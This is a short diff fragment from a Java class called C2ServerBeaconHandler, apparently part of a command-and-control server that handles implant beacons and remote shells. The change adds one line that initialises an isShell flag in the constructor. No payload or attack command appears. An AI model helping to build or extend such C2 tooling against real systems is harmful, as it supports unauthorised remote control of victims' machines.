@@ -37,6 +37,7 @@ public class C2ServerBeaconHandler implements Runnable{
         this.sendLock = new Object();
         this.keepAliveClass = new keepAlive(duplexer, sendLock, false, false);
         this.keepAliveThread = new Thread(keepAliveClass);
+        this.isShell = false;
         this.shellLock = shellLock;
     }
 
